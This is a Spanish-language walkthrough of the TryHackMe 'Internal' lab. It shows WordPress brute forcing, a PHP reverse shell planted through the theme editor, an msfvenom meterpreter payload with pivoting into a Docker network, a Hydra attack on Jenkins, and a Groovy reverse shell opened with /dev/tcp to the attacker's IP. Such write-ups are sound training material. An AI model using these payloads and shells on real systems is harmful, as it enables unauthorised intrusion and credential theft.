# Internal

**Platform:** TryHackMe  
**Difficulty:** Hard  
**IP:** 10.10.158.248

---

## 1. Información Inicial
- **Objetivo:** Obtener las dos banderas tanto del usuario como de root.  
- **Herramientas iniciales:** `nmap`, `gobuster`, `wpscan`, `hydra`, `reverse shell`, `netcat`, `msfvenom`, `metasploit`, `ssh`.

---

## 2. Reconocimiento y enumeración

Primero realizamos un escaneo básico con `nmap` para identificar los servicios abiertos:
```bash 
nmap -sC -sV --min-rate 5000 -p- 10.10.158.248
```
![Escaneo con nmap para descubrimiento de puertos y servicios](screenshots/1.nmap.png)

Tan solo nos muestra el puerto 22 y 80, y ya que no tenemos ninguna credencial para SSH vamos a entrar al sitio web.

![Inspección del sitio web](screenshots/3.sitio_web.png)

Tras inspeccionar el sitio web y no encontrar ningún vector de ataque, vamos a realizar una búsqueda de directorios públicos a partir del sitio web con la herramienta `gobuster`.

![Utilización de gobuster para búsqueda de directorios y rutas públicas](screenshots/2.gobuster.png)

```bash 
gobuster dir -u 10.10.158.248 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Entre los directorios que hemos encontrado no hay nada particular, un PHPMyAdmin para el que no tenemos credenciales y poco más.
Sin embargo, la tenemos una ruta que indica que hay un Wordpress detrás del sitio y podemos tratar de analizarlo con la herramienta `WPScan`.

Utilizaremos el parámetro -e para búsqueda de usuarios, plugins vulnerables, temas vulnerables, backups, ficheros de configuración, etc.

```bash 
wpscan --url http://10.10.158.248/blog/ -e
```

![Ejecución de wpscan para análisis del sitio web](screenshots/4.wpsan_user.png)

Hemos descubierto el usuario `admin`, desde el que podemos partir para hacer un ataque de fuerza bruta al panel de inicio de sesión de Wordpress.
Este ataque puede realizarse con Hydra o con WPScan, pero usaremos la segunda ya que la sintaxis es mucho más simple.

```bash 
wpscan --url http://10.10.158.248/blog/ -U admin -P /usr/share/wordlists/rockyou.txt
```
![Ejecución de wpscan para realizar fuerza bruta a la contraseña del usuario admin](screenshots/5.wpscan_password.png)

Cuando finaliza el programa, observamos que hay una exclamación roja donde nos indica la contraseña del usuario admin. Utilizaremos estas credenciales para acceder al panel de administración de WordPress.

![Panel de control de administración de WordPress](screenshots/7.wp-admin-pannel.png)

Como estamos acostumbrados en este tipo de máqunias, WordPress suele tener ficheros PHP para modificar en Appearance  > Themes Editor.
En cualquiera de los ficheros PHP al que podamos acceder desde la URL vamos a eliminar el contenido y a modificar el código de la clásica php-reverse-shell.php de pentestmonkey con nuestra dirección IP.


![Reverse shell de pentestmonkey](screenshots/8.rv_shell-pentestmonkey.png)

![Modificación del código php en el fichero de WordPress](screenshots/9.php_modification.png)

De esta manera obtendremos una conexión en netcat donde estableceremos una shell. Para ello también tenemos que poner a la escucha netcat en nuestra máquina local.

```bash 
nc -lvnp 1234
```

Para establecer la conexión solo nos queda acceder al fichero a través de la URL para que se ejecute.

![Reverse shell creada en netcat de la máquina local](screenshots/10.netcat_with_shell.png)

Tras investigar el sistema de la máquina víctima y no encontrar nada a simple vista, vamos a utilizar la herramienta `linpeas`, para buscar algún fichero que nos aporte alguna credencial, ya que no podemos acceder a ningún directorio personal.

En la máqunia local abrimos el servidor para compartir el fichero:
```bash 
python -m http.server 
```

En la máquina víctima lo descargamos, le asignamos permisos de ejecución y lo ejecutamos:
```bash 
wget http://10.8.29.132:8000/linpeas.sh
chmod a+x linpeas.sh
./linpeas.sh
```

![Apertura de servvidor python para compartir el fichero linpeas.sh](screenshots/11.python_server.png)

![Descarga del fichero linpeas en la máquina víctima](screenshots/12.wget.png)

![Ejecución de linpeas en la máquina víctima](screenshots/13.linpeas.png)

Tras un buen rato observando el resultado de la herramienta linpeas.sh, encontramos algunas vulnerabilidades que podrían ser explotadas pero no aparentan seguir el flujo de la máquina, así que seguimos revisando hasta encontrar un fichero de guardado de WordPress en el directorio /opt.

![Ejecución de linpeas en la máquina víctima](screenshots/14.linpeas_result.png)

Al no tener mucho sentido ese fichero en esa localización, lo abrimos y descubrimos que contiene las credenciales de otro usuario.

![Localización de credenciales para usuario aubreanna en fichero encontrado](screenshots/15.wp-save-file.png)

Accedemos al usuario aubreanna y nos dirigimos a su directorio personal, donde hayamos la primera bandera (user.txt).
Además de la bandera, hay otro fichero llamado jenkins.txt que nos dice que en el puerto 8000 de la 172.17.0.2 está corriendo un servicio Jenkins.

![Fichero con la primera bandera y otro fichero con una pista sobre otra dirección](screenshots/16.user_y_jenkins.png)

Si hacemos un `ifconfig` apreciamos una segunda interfaz de red de docker, que pertenece a otra red en la que parece ocultarse ese servicio.

![Ifconfig desde máquina víctima](screenshots/17.ifconfig.png)

Hay muchas maneras de poder acceder a esa red, y aunque no sea la más rápida (ya que podemos establecer un túnel por SSH) vamos a usar el método que aprendemos en la eJPTv2.

Utilizaremos una shell de meterpreter para realizar el pivoting. Para ello crearemos un fichero malicioso con MSFVenom que realice una conexión a meterpreter (que estará a la escucha en nuestra máquina local). 

```bash 
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.8.29.132 LPORT=4444 -f elf -e x64/xor -i 5 -o shell64.elf
```

![Preparación de fichero malicioso con msfvenom](screenshots/18.preparing_msfvenom.png)

Lo siguiente es usar exploit/multi/handler de metasploit y asignarle el LHOST y el LPORT:

```bash 
use exploit/multi/handler
set LPORT 4444
set LHOST 10.8.29.132
run
```

![Poniendo a la escucha el multi/handler de Metasploit para establecer la conexión](screenshots/19.metasploit.png)

Por último descargamos con wget el fichero en la máquina víctima, establecemos permisos de conexión y lo ejecutamos.
```bash 
wget http://10.8.29.132:8000/shell64.elf
chmod a+x shell64.elf
./shell64.elf
```

![Ejecución de exploit desde víctima](screenshots/20.exploit_execution.png)

Desde Metasploit ya hemos recibido la conexión entrate y establecido una shell de meterpreter, desde la que ya podemos realizar un ifconfig y vamos a proceder a realizar el pivoting.

![Conexión recibida por Metasploit y establecimiento de shell de meterpreter](screenshots/21.ifconfig_meterpreter.png)

Para realizar el `pivoting` primero le indicaremos a meterpreter la dirección de red para que la ingrese en la tabla de rutas, luego haremos uso de esa tabla y realizaremos el Port Forwarding donde el puerto 1234 de nuestra máqunia local creará una conexión túnel con el puerto 8080 de la máqunia con la IP 172.17.0.2.

```bash 
run autoroute -s 172.17.0.0/16
run autoroute -p
portfwd add -l 1234 -p 8080 -r 172.17.0.2
```

![Pivoting desde meterpreter para puerto 8080 de la IP 172.17.0.2](screenshots/22.pivoting.png)

![Ejecución de exploit desde víctima](screenshots/23.pivoting2.png)

Finalmente, si accedemos a través de la URL de nuestro navegador a localhost:1234 recibiremos la respuesta del servicio Jenkins.


![Inicio de sesión de Jenkins](screenshots/24.jenkins.png)

> **Nota:** A partir de este punto tuve que cambiar de máquina, pero continué el proceso por donde lo dejé.

Investigando por internet sobre las credenciales por defecto obtuvimos que el usuario por defecto y que en la mayoría de máquinas suele dejarse así es `admin`.
Esta vez vamos a tener que utilizar Hydra para, con un ataque de fuerza bruta, obtener la contraseña del usuario.

```bash 
hydra localhost -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -s 1234 -l admin -P /usr/share/wordlists/rockyou.txt
```

![Fuerza bruta al usuario de jenkins para la obtención de su contraseña](screenshots/25.hydra.png)

Al ingresar las credenciales entramos dentro del panel de administración de Jenkins.

![Panel principal de administración de Jenkins](screenshots/26.jenkins_panel.png)

Tras observar cada opción del servicio, tenemos una herramienta llamada Script Console. 

![Búsqueda de opciones para poder vulnerar el servicio](screenshots/27.script_console.png)

Se trata de una herramienta capaz de ejecutar código Java, así que si ingresamos un código que se conecte a netcat para generar una shell, tendremos acceso a esta segunda máquina.

```bash 
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5\<>/dev/tcp/10.8.29.132/4444; cat \<&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![Script Console de Jenkins donde ingresamos código para obtener una reverse shell](screenshots/28.shell_in_terminal.png)

Al acceder a la segunda máquina por netcat, no ha sido necesario volver a utilizar la herramienta linpeas.sh debido a que en el mismo directorio donde teníamos la primera pista, encontramos un fichero de texto con la contraseña del usuario root.

![Obtención de contraseña de root en fichero dentro de /opt](screenshots/29.root_credential.png)

Accedemos al usuario root y leemos el fichero que contiene la segunda bandera.

```bash 
ssh root@internal.thm
```

![Obtención de segunda bandera en el directorio /root](screenshots/30.root-txt.png)

